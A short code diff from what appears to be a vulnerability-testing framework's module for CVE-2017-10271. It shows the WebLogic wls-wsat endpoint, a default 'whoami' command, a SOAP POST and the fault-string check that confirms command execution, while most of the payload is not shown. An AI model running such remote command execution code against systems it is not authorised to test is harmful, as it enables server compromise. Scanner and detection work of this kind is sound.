@@ -22,7 +22,7 @@ class CVE_2017_10271(Star):
         'CVE': 'CVE-2017-10271',
         'TAG': []
     }
-    type = target_type.MODULE
+    type = target_type.VULNERABILITY
 
     def light_up(self, dip, dport, cmd='whoami', *args, **kwargs) -> (bool, dict):
         url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
@@ -46,8 +46,7 @@ class CVE_2017_10271(Star):
       <soapenv:Body/>
     </soapenv:Envelope>
     '''.format(t_data)
-
         res, data = http(url, 'POST', data=data, verify=False, timeout=3, headers=headers)
-        if res and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
+        if res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text):
             return True, {'msg': 'finish.'}
         return False, {'msg': 'finish.'}
